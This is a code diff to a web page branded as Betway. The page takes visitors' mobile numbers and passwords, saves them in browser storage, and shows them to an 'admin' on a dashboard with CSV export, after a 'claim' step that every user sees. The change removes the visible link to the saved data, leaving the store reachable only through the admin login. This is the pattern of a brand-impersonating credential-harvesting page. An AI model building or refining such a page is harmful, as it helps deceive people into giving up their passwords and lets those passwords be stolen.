@@ -381,21 +381,6 @@
             text-decoration: underline;
         }
 
-        .view-data-link {
-            text-align: center;
-            margin-top: 0.5rem;
-        }
-        .view-data-link a {
-            color: #00a651;
-            font-size: 0.7rem;
-            text-decoration: none;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        .view-data-link a:hover {
-            text-decoration: underline;
-        }
-
         .footer-note {
             padding: 0.8rem 1.5rem 1rem 1.5rem;
             text-align: center;
@@ -416,7 +401,7 @@
             margin: 0 4px;
         }
 
-        /* Data Dashboard */
+        /* Data Dashboard - ADMIN ONLY */
         .data-dashboard {
             max-width: 700px;
             width: 100%;
@@ -583,7 +568,7 @@
             background: #e55a2b;
         }
 
-        /* Caution Modal */
+        /* Caution Modal - appears for ALL users after claiming */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -895,11 +880,6 @@
             <div class="signup-prompt">
                 Don't have an account yet? <a href="#">Sign Up</a>
             </div>
-
-            <!-- Admin View Data Link -->
-            <div class="view-data-link" id="viewDataLink" style="display: none;">
-                <a id="viewDataBtn"><i class="fas fa-database"></i> View Saved Data</a>
-            </div>
         </div>
 
         <div class="footer-note">
@@ -907,7 +887,7 @@
         </div>
     </div>
 
-    <!-- Data Dashboard -->
+    <!-- Data Dashboard - ADMIN ONLY -->
     <div class="data-dashboard" id="dataDashboard">
         <div class="data-header">
             <div class="brand">Bet<span>way</span></div>
@@ -943,7 +923,7 @@
         </div>
     </div>
 
-    <!-- Caution Modal -->
+    <!-- Caution Modal - appears for ALL users after claiming -->
     <div class="modal-overlay" id="cautionModal">
         <div class="modal-box">
             <div class="modal-icon"><i class="fas fa-exclamation-triangle"></i></div>
@@ -979,8 +959,6 @@
             const recordCount = document.getElementById('recordCount');
             const exportCsvBtn = document.getElementById('exportCsvBtn');
             const clearDataBtn = document.getElementById('clearDataBtn');
-            const viewDataLink = document.getElementById('viewDataLink');
-            const viewDataBtn = document.getElementById('viewDataBtn');
             const toast = document.getElementById('toast');
 
             const STORAGE_KEY = 'betway_user_data';
@@ -1020,7 +998,7 @@
                 this.classList.toggle('fa-eye-slash');
             });
 
-            // Check if duplicate exists (same mobile AND same password)
+            // Check if duplicate exists (same mobile AND same password) - for regular users only
             function isDuplicate(mobile, password) {
                 const existingData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
                 return existingData.some(item => item.mobile === mobile && item.password === password);
@@ -1029,7 +1007,6 @@
             // Save data to localStorage
             function saveData(mobile, password, isAdmin = false) {
                 try {
-                    // If admin, ALWAYS save (no duplicate check)
                     let existingData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
 
                     // Only check for duplicates if NOT admin
@@ -1131,7 +1108,7 @@
                 }
             }
 
-            // Show dashboard
+            // Show dashboard (ADMIN ONLY)
             function showDashboard() {
                 mainCard.classList.remove('visible');
                 setTimeout(() => {
@@ -1152,11 +1129,6 @@
                     mainCard.style.display = 'flex';
                     setTimeout(() => {
                         mainCard.classList.add('visible');
-                        if (isAdminLoggedIn) {
-                            viewDataLink.style.display = 'block';
-                        } else {
-                            viewDataLink.style.display = 'none';
-                        }
                     }, 50);
                 }, 300);
             }
@@ -1182,7 +1154,6 @@
                         cautionModal.classList.add('active');
                         mobileInput.value = '';
                         passwordInput.value = '';
-                        viewDataLink.style.display = 'block';
                     }
                     return;
                 }
@@ -1196,9 +1167,10 @@
                 }
             });
 
-            // Close caution modal and show dashboard if admin
+            // Close caution modal
             closeModalBtn.addEventListener('click', function() {
                 cautionModal.classList.remove('active');
+                // If admin, show dashboard after closing modal
                 if (isAdminLoggedIn) {
                     setTimeout(() => {
                         showDashboard();
@@ -1217,18 +1189,10 @@
                 }
             });
 
-            // View Data button (admin only)
-            viewDataBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                if (isAdminLoggedIn) {
-                    showDashboard();
-                } else {
-                    showToast('Please login with admin credentials to view data.', 'warning');
-                }
-            });
-
-            // Back button
+            // Back button (from dashboard)
             backBtn.addEventListener('click', function() {
+                // Reset admin flag when going back
+                isAdminLoggedIn = false;
                 showMainCard();
             });
 
